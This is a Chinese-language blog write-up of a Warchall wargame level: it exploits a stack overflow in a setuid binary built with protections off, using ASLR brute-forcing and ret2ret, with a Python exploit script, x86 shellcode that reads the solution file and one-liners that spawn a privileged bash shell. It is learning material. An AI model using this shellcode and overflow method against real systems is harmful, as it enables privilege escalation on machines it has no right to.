<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubarco</title><meta property="og:title" content="Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubarco"><link href=https://cubl.in/favicon.ico rel=icon type=image/x-icon><meta name=description content="Hack, Python, Writeup"><link rel=stylesheet href=/css/main.min.3bcbe33ae5c46485bcebc6352fc91232f950eb735ccac53f81bd19d79251ba9c.css media=all></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/>Index</a></li><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=/links/>Links</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-Training: Warchall - 7 Tropical Fruits</h1><span class=article-date>2014-05-14</span>
<a class=article-tag href=/tags/hack>Hack</a>
<a class=article-tag href=/tags/python>Python</a>
<a class=article-tag href=/tags/writeup>Writeup</a><div class=article-content><p>Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！</p><p>做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！</p><p>一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。</p><p>所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell……</p><p>然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span><span class=k>extern</span> <span class=kt>char</span> <span class=o>**</span><span class=n>environ</span><span class=p>;</span>
<span class=kt>int</span> <span class=nf>execl</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...);</span>
<span class=kt>int</span> <span class=nf>execlp</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...);</span>
<span class=kt>int</span> <span class=nf>execle</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...,</span> <span class=kt>char</span> <span class=o>*</span> <span class=k>const</span> <span class=n>envp</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execv</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execvp</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execve</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>envp</span><span class=p>[]);</span>
<span class=c1>//其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。
</span></code></pre></div><p>这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。</p><p>第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
</span><span class=cp></span>gcc -fno-stack-protector -z execstack level7.c -o level7
chmod <span class=m>6755</span> level7
</code></pre></div><p>是的…出题者把DEP关掉了…然后我就睡不着了</p><h2 id=解法>解法：</h2><p>今天早上考完离散就立马赶回寝室继续撸这道题，虽然解法很很蠢(对stack的5个随机位进行碰撞)，但是至少能在10分钟内出结果……</p><p>先给solution.txt建一个到工作目录软连接:</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ ln -s /home/level/tropic/7/solution.txt ./lk
</code></pre></div><p>然后跑这个python脚本：</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># -*- coding=utf8 -*-</span>
<span class=n>__author__</span> <span class=o>=</span> <span class=s1>&#39;Cubarco&#39;</span>


<span class=k>def</span> <span class=nf>tropic_crack</span><span class=p>():</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=n>shellcode</span> <span class=o>=</span> <span class=s2>&#34;1</span><span class=se>\xc0\x99</span><span class=s2>Rh/cath/bin</span><span class=se>\x89\xe3</span><span class=s2>Rh./lk&#34;</span> \
                    <span class=s2>&#34;</span><span class=se>\x89\xe1\xb0\x0b</span><span class=s2>RQS</span><span class=se>\x89\xe1\xcd\x80</span><span class=s2>&#34;</span>
        <span class=n>stack_hex</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mh>0xbf00000</span><span class=p>,</span> <span class=mh>0xbffffff</span><span class=p>)</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=mh>0x01</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
        <span class=n>stack_int</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>stack_hex</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
        <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/home/level/tropic/7/level7&#34;</span>
        <span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>path</span><span class=p>,</span>
                <span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>312</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
                <span class=o>+</span> <span class=n>shellcode</span>
                <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&amp;lt;L&#39;</span><span class=p>,</span> <span class=n>stack_int</span><span class=p>)]</span>
        <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>(&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\&#34;</span><span class=s2>&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>)&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\\</span><span class=s2>&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\&#39;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\&#39;</span><span class=s2>&#34;</span><span class=p>)</span>
        <span class=n>p</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>args</span><span class=p>,</span>
                             <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
                             <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
                             <span class=n>shell</span><span class=o>=</span><span class=bp>False</span><span class=p>)</span>
        <span class=n>rsp</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
        <span class=k>if</span> <span class=n>rsp</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
            <span class=k>print</span> <span class=n>rsp</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=c1># print traceback.format_exc()</span>
        <span class=c1># 好像subprocess开太快了会出问题...</span>
        <span class=k>pass</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=kn>import</span> <span class=nn>struct</span>
    <span class=kn>import</span> <span class=nn>random</span>
    <span class=kn>import</span> <span class=nn>subprocess</span>
    <span class=kn>import</span> <span class=nn>traceback</span>
    
    <span class=k>while</span> <span class=bp>True</span><span class=p>:</span>
        <span class=n>tropic_crack</span><span class=p>()</span>
</code></pre></div><p>做完题去题解讨论区看到个ret2ret的思路感觉好棒，有时间研究一下。</p><p>对了，跑脚本的时候如果它卡住了而且ctrl+c关不掉请不要来打我。正确姿势是killall…..</p><p>UPDATE: 刚看了一下ret2ret，我想去死一死了。是的，只用下面一句话就能搞定，oh，前提还是给solution.txt建立一个到工作目录的软链接，名字是lk（其实是因为./lk刚好是四字节， 如果用原来的路径好麻烦还要四字节对齐，偷个懒）</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span class=sb>`</span>python -c <span class=s2>&#34;print &#39;\x90&#39;*(312-33)+&#39;1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span class=sb>`</span>
<span class=c1># 0x080484d2是程序里面一个执行ret指令的地址，随便挑！</span>
</code></pre></div><p>更BT一点还可以这样，跑一个/bin/bash -p：</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span class=sb>`</span>python -c <span class=s2>&#34;print &#39;\x90&#39;*(312-33)+&#39;j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span class=sb>`</span>
bash-4.2$ id
<span class=nv>uid</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span> <span class=nv>egid</span><span class=o>=</span>1008<span class=o>(</span>level7<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span>
<span class=c1># 然后你就有level7的egid了...</span>
</code></pre></div><h2 id=参考> 参考：</h2><ol><li>Hackers Hut#<a href=http://www.win.tue.nl/~aeb/linux/hh/hh-10.html>Smashing The Stack</a>(ASLR bypassing overview)</li><li><a href=http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf>Performing a ret2libc Attack</a>(ret2libc)</li><li><a href=http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf>Return-to-libc Attack Lab</a>(ret2libc)</li><li><a href=http://web.textfiles.com/hacking/smackthestack.txt>Smack the Stack</a>(ret2ret)</li></ol></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname label="Comments 💬" theme=boxy-light crossorigin=anonymous async defer></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank rel="noopener norefferrer">Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>© 2014 - 2014</a></li></ul></footer></div><script async src=https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@gh-pages/js/async.min.f0ee05a5180b84c9031dc6048a165e3238369671eaac5df72f9fc961a2bb03f78685ba489261432234bcbad8b66c86ffa90cffd19f60c4b28ef06e677fc9763f.js onload=window.GistEmbed.init()></script><script async defer src=https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js></script><script>window.ga_tid="UA-54867602-1",window.ga_api="https://cubl.in/ga-proxy/"</script><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3 async defer></script><script async defer data-website-id=e9fdcc32-0bfa-4de5-beb0-3bbf1e4638ab src=https://umami.2oo.in/umami.js></script></body></html>